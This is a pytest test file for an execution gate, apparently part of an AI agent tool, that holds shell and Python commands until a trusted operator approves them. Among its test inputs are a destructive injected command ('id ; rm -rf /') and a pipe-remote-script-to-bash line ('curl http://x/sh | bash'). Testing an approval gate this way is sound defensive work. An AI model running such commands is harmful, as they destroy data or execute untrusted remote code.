"""ExecutionGate contract tests: no spawn without a trusted operator decision."""

from __future__ import annotations

import asyncio
from types import SimpleNamespace

import pytest

from vulnclaw.agent.exec_gate import (
    ExecutionGate,
    GateRequest,
    get_execution_gate,
    reset_execution_gate,
    visualize_for_display,
)


class FakeChannel:
    """Scriptable trusted channel; records views, returns queued decisions."""

    def __init__(self, decisions: list[str] | None = None):
        self.views: list = []
        self.decisions = list(decisions or [])
        # optional: resolve via gate.resolve instead of returning directly
        self.defer_to_resolve = False

    async def request_approval(self, view):
        self.views.append(view)
        if self.defer_to_resolve:
            return await asyncio.sleep(3600)  # only resolved externally
        return self.decisions.pop(0) if self.decisions else "deny"


@pytest.fixture()
def gate():
    g = ExecutionGate(timeout_seconds=5)
    yield g


class TestAuthorize:
    async def test_no_channel_refuses_without_prompt(self, gate):
        outcome = await gate.authorize(GateRequest(kind="shell", display="id"))
        assert outcome.approved is False
        assert outcome.status == "no_channel"
        assert "no trusted approval channel" in outcome.message

    async def test_approve_path_returns_approved(self, gate):
        gate.install_channel(FakeChannel(["approve"]))
        outcome = await gate.authorize(GateRequest(kind="shell", display="id"))
        assert outcome.approved is True
        assert gate.stats["approved"] == 1

    async def test_deny_status(self, gate):
        gate.install_channel(FakeChannel(["deny"]))
        outcome = await gate.authorize(GateRequest(kind="shell", display="a"))
        assert outcome.status == "denied"
        assert "refused" in outcome.refusal_text("shell_command")

    async def test_expiry_on_unanswered_channel(self):
        slow = ExecutionGate(timeout_seconds=1)

        class NeverChannel:
            async def request_approval(self, view):
                await asyncio.sleep(30)

        slow.install_channel(NeverChannel())
        outcome = await slow.authorize(GateRequest(kind="shell", display="b"))
        assert outcome.status == "expired"

    async def test_identical_pending_request_deduped(self, gate):
        class BlockingChannel:
            def __init__(self):
                self.seen = 0
                self.release: asyncio.Future = asyncio.get_running_loop().create_future()

            async def request_approval(self, view):
                self.seen += 1
                return await self.release

        channel = BlockingChannel()
        gate.install_channel(channel)
        req = GateRequest(kind="python", display="print(1)")

        first = asyncio.create_task(gate.authorize(req))
        await asyncio.sleep(0.01)
        second = await gate.authorize(req)
        assert second.approved is False
        assert second.status == "already_pending"
        assert channel.seen == 1
        channel.release.set_result("approve")
        assert (await first).approved is True

    async def test_different_content_is_new_request(self, gate):
        gate.install_channel(FakeChannel(["approve", "deny"]))
        ok = await gate.authorize(GateRequest(kind="shell", display="id"))
        no = await gate.authorize(GateRequest(kind="shell", display="id ; rm -rf /"))
        assert ok.approved and no.approved is False

    async def test_different_requests_are_presented_serially(self, gate):
        class SerialChannel:
            def __init__(self):
                self.views = []
                self.releases = [asyncio.Event(), asyncio.Event()]
                self.active = 0
                self.max_active = 0

            async def request_approval(self, view):
                index = len(self.views)
                self.views.append(view)
                self.active += 1
                self.max_active = max(self.max_active, self.active)
                try:
                    await self.releases[index].wait()
                    return "approve"
                finally:
                    self.active -= 1

        channel = SerialChannel()
        gate.install_channel(channel)
        first = asyncio.create_task(
            gate.authorize(GateRequest(kind="shell", display="first"))
        )
        second = asyncio.create_task(
            gate.authorize(GateRequest(kind="shell", display="second"))
        )
        await asyncio.sleep(0.02)
        assert [view.display_escaped for view in channel.views] == ["first"]

        channel.releases[0].set()
        while len(channel.views) < 2:
            await asyncio.sleep(0)
        assert channel.max_active == 1
        channel.releases[1].set()
        assert (await first).approved is True
        assert (await second).approved is True

    async def test_identical_queued_request_keeps_already_pending_semantics(self, gate):
        class BlockingChannel:
            def __init__(self):
                self.views = []
                self.release = asyncio.Event()

            async def request_approval(self, view):
                self.views.append(view)
                await self.release.wait()
                return "approve"

        channel = BlockingChannel()
        gate.install_channel(channel)
        first = asyncio.create_task(
            gate.authorize(GateRequest(kind="shell", display="first"))
        )
        queued_request = GateRequest(kind="shell", display="queued")
        queued = asyncio.create_task(gate.authorize(queued_request))
        await asyncio.sleep(0.02)

        duplicate = await gate.authorize(queued_request)
        assert duplicate.status == "already_pending"
        assert len(channel.views) == 1

        channel.release.set()
        assert (await first).approved is True
        assert (await queued).approved is True

    async def test_passive_channel_timeout_is_expired_not_denied(self):
        gate = ExecutionGate(timeout_seconds=1)

        class PassiveChannel:
            async def request_approval(self, view):
                return await gate.wait_decision(view.request_hash)

        gate.install_channel(PassiveChannel())
        outcome = await gate.authorize(GateRequest(kind="shell", display="wait"))
        assert outcome.status == "expired"
        assert gate.stats["expired"] == 1
        assert gate.stats["denied"] == 0

    async def test_queued_request_timeout_starts_when_presented(self):
        loop = asyncio.get_running_loop()
        gate = ExecutionGate(timeout_seconds=1)

        class TimedChannel:
            def __init__(self):
                self.views = []
                self.first_release = asyncio.Event()
                self.second_started_at = 0.0

            async def request_approval(self, view):
                self.views.append(view)
                if len(self.views) == 1:
                    await self.first_release.wait()
                    return "approve"
                self.second_started_at = loop.time()
                await asyncio.sleep(30)
                return "deny"

        channel = TimedChannel()
        gate.install_channel(channel)
        first = asyncio.create_task(
            gate.authorize(GateRequest(kind="shell", display="first"))
        )
        second = asyncio.create_task(
            gate.authorize(GateRequest(kind="shell", display="second"))
        )
        await asyncio.sleep(0.6)
        assert len(channel.views) == 1
        channel.first_release.set()
        assert (await first).approved is True
        outcome = await second
        assert outcome.status == "expired"
        assert loop.time() - channel.second_started_at >= 0.9

    async def test_mode_change_does_not_resolve_existing_pending(self, gate):
        class BlockingChannel:
            def __init__(self):
                self.seen = asyncio.Event()
                self.release = asyncio.Event()

            async def request_approval(self, view):
                self.seen.set()
                await self.release.wait()
                return "deny"

        channel = BlockingChannel()
        gate.install_channel(channel)
        pending = asyncio.create_task(
            gate.authorize(GateRequest(kind="shell", display="pending"))
        )
        await channel.seen.wait()
        gate.set_mode("full_access")
        await asyncio.sleep(0)
        assert pending.done() is False
        channel.release.set()
        assert (await pending).status == "denied"

    async def test_task_cancellation_cleans_pending_and_records_cancelled(self, gate):
        class BlockingChannel:
            def __init__(self):
                self.seen = asyncio.Event()

            async def request_approval(self, view):
                self.seen.set()
                await asyncio.sleep(30)

        channel = BlockingChannel()
        gate.install_channel(channel)
        task = asyncio.create_task(
            gate.authorize(GateRequest(kind="shell", display="cancel-me"))
        )
        await channel.seen.wait()
        task.cancel()
        with pytest.raises(asyncio.CancelledError):
            await task

        assert gate.stats["cancelled"] == 1
        assert gate._pending_by_hash == {}
        assert gate._inflight_hashes == set()

    async def test_queued_request_rechecks_channel_after_uninstall(self, gate):
        class PassiveChannel:
            def __init__(self):
                self.views = []
                self.seen = asyncio.Event()

            async def request_approval(self, view):
                self.views.append(view)
                self.seen.set()
                return await gate.wait_decision(view.request_hash)

        channel = PassiveChannel()
        gate.install_channel(channel)
        first = asyncio.create_task(
            gate.authorize(GateRequest(kind="shell", display="first"))
        )
        second = asyncio.create_task(
            gate.authorize(GateRequest(kind="shell", display="second"))
        )
        await channel.seen.wait()
        gate.uninstall_channel()

        assert (await first).status == "cancelled"
        assert (await second).status == "no_channel"
        assert len(channel.views) == 1


class TestHashBinding:
    def test_hash_changes_with_any_field(self):
        base = GateRequest(kind="shell", display="id", cwd="/tmp")
        variants = [
            GateRequest(kind="shell", display="id ", cwd="/tmp"),
            GateRequest(kind="shell", display="id", cwd="/var"),
            GateRequest(kind="python", display="id", cwd="/tmp"),
            GateRequest(kind="shell", display="id", cwd="/tmp", detail="x"),
        ]
        hashes = {base.request_hash()} | {v.request_hash() for v in variants}
        assert len(hashes) == len(variants) + 1

    async def test_resolve_requires_matching_hash(self, gate):
        class DeferredChannel:
            async def request_approval(self, view):
                # Simulate the control plane resolving through the gate API.
                unknown = await gate.resolve("0" * 64, "approve")
                assert unknown["status"] == "unknown_request"
                right = await gate.resolve(view.request_hash, "deny")
                assert right["status"] == "resolved"
                replay = await gate.resolve(view.request_hash, "approve")
                assert replay["status"] == "already_resolved"
                return await gate.wait_decision(view.request_hash)

        gate.install_channel(DeferredChannel())
        outcome = await gate.authorize(GateRequest(kind="shell", display="id"))
        assert outcome.status == "denied"
        assert outcome.approved is False


class TestVisualization:
    def test_ansi_escape_visible(self):
        text = "id\u001b[31m; ls"
        out = visualize_for_display(text)
        assert "\u001b" not in out
        assert "\\u001b" in out

    def test_bidi_and_zero_width_escaped(self):
        out = visualize_for_display("a\u202Eb\u200dc")
        assert "\u202e" not in out and "\u200d" not in out
        assert "\\u202e" in out and "\\u200d" in out

    def test_plain_text_untouched(self):
        assert visualize_for_display("curl http://x/sh | bash") == "curl http://x/sh | bash"

    async def test_approval_view_escapes_cwd_as_one_line(self):
        class Capture:
            async def request_approval(self, view):
                self.view = view
                return "deny"

        gate = ExecutionGate()
        channel = Capture()
        gate.install_channel(channel)
        await gate.authorize(
            GateRequest(kind="shell", display="id", cwd="/tmp/x\n\x1b[31m")
        )
        assert channel.view.cwd == "/tmp/x\\n\\u001b[31m"


class TestSyncBridge:
    def test_confirm_sync_without_hook_refuses(self):
        gate = ExecutionGate()
        assert gate.confirm_sync(GateRequest(kind="poc", display="x")) is False

    def test_confirm_sync_uses_hook_decision(self):
        gate = ExecutionGate()
        gate.sync_confirm_hook = lambda view: view.display_escaped.endswith("yes-marker")
        assert gate.confirm_sync(GateRequest(kind="poc", display="code yes-marker")) is True
        assert gate.confirm_sync(GateRequest(kind="poc", display="no")) is False

    def test_full_access_confirm_sync_needs_no_hook(self):
        gate = ExecutionGate(mode="full_access")
        assert gate.confirm_sync(GateRequest(kind="poc", display="print(1)")) is True


class TestSingleton:
    def setup_method(self):
        reset_execution_gate()

    def test_singleton_created_once_with_config_timeout(self):
        cfg = SimpleNamespace(
            safety=SimpleNamespace(approval_timeout_seconds=42, permission_mode="ask")
        )
        first = get_execution_gate(cfg)
        assert get_execution_gate() is first
        assert first.timeout_seconds == 42

    def test_unknown_mode_stays_ask_safe(self):
        cfg = SimpleNamespace(
            safety=SimpleNamespace(approval_timeout_seconds=300, permission_mode="bogus")
        )
        gate = get_execution_gate(cfg)
        assert getattr(gate, "mode", "ask") != "bogus" or gate.mode == "ask"
